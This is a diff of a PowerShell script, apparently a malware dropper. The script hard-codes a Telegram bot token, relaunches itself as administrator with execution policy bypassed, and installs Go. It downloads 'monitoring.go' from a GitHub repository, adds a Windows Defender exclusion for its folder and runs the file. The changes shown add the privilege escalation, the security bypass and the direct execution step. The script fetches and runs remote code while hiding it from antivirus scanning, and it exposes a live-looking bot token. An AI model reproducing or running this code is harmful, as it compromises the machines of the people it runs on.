@@ -4,22 +4,19 @@
 
 param(
     [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
-    [string]$Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile.go",
-    [string]$DestFolder = "",
     [switch]$Auto,
     [switch]$RunHidden
 )
 
 # Config
 $LogFile = Join-Path $env:TEMP "download_runner.log"
-$GoVersion = "1.24.7"
-$Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
-$MsiName = "go$GoVersion.windows-$Arch.msi"
-$MsiUrl = "https://go.dev/dl/$MsiName"
+$MsiName = "go1.24.7.windows-amd64.msi"
+$MsiUrl = "https://go.dev/dl/go1.24.7.windows-amd64.msi"
+$Url = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"
 $GoInstallDir = "C:\Program Files\Go"
 $GoBinPath = Join-Path $GoInstallDir "bin"
 $GoFileName = "monitoring.go"
-$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $env:USERPROFILE "Downloads\secfnx" }
+$DestFolder = Join-Path $env:USERPROFILE "Downloads\secfnx"
 $GoFilePath = Join-Path $DestFolder $GoFileName
 $PathLog = Join-Path $DestFolder "path_sec.log"
 $LogMaxSize = 10MB
@@ -42,7 +39,7 @@ function Log {
 # Helper: Log path to path_sec.log
 function Log-Path {
     param($Path, $Type)
-    $Line = "$(Get-Date -Format o) - ${Type}: $Path" # Fixed parsing error
+    $Line = "$(Get-Date -Format o) - ${Type}: $Path"
     Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue
 }
 
@@ -60,15 +57,15 @@ function Download-File($SourceUrl, $OutPath) {
     Log "Downloading $SourceUrl -> $OutPath"
     Log-Path $OutPath "File Downloaded"
     try {
-        $ProgressPreference = 'SilentlyContinue'
-        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
+        $ProgressPreference = 'Continue'
+        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -ErrorAction Stop
         Log "Downloaded successfully"
         return $true
     } catch {
         Log "Download failed: $_"
         return $false
     } finally {
-        $ProgressPreference = 'Continue'
+        $ProgressPreference = 'SilentlyContinue'
     }
 }
 
@@ -249,7 +246,14 @@ function Install-GoDependencies($GoFile) {
 }
 
 # Main
-Log "Script started. DestFolder: $DestFolder, Url: $Url"
+Log "Script started. Url: $Url"
+if (-not (Test-IsAdmin)) {
+    Log "Script not running as admin. Relaunching as admin."
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSScriptRoot\$($MyInvocation.MyCommand.Name)`""
+    exit
+}
+
+cd (Split-Path $DestFolder -Parent)
 if (-not (Test-Path $DestFolder)) {
     Log "Creating destination folder: $DestFolder"
     New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
@@ -274,6 +278,10 @@ if (Test-Path $GoFilePath) {
     Log "Removing existing monitoring.go to avoid conflicts"
     Remove-Item $GoFilePath -Force -ErrorAction SilentlyContinue
 }
+if ($Url -match "github.com/.+/blob/(.+)$") {
+    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
+    Log "Converted blob URL to raw: $Url"
+}
 if (-not (Download-File $Url $GoFilePath)) {
     Log "Failed to download Go script. Exiting."
     exit 1
@@ -285,17 +293,24 @@ if (-not (Install-Go)) {
     exit 1
 }
 
+# Change to secfnx folder
+cd $DestFolder
+
+# Set security bypass
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Log "Set security bypass"
+
 # Add Defender exclusion
 Add-DefenderExclusion $DestFolder
 
-# Install dependencies and run
+# Install dependencies
 if (-not (Install-GoDependencies $GoFilePath)) {
     Log "Failed to install dependencies. Exiting."
     exit 1
 }
-if (-not (Run-GoScript $GoFilePath)) {
-    Log "Failed to run Go script. Exiting."
-    exit 1
-}
+
+# Run go run monitoring.go
+Log "Running go run monitoring.go from $DestFolder"
+go run monitoring.go
 
 Log "Script completed successfully."
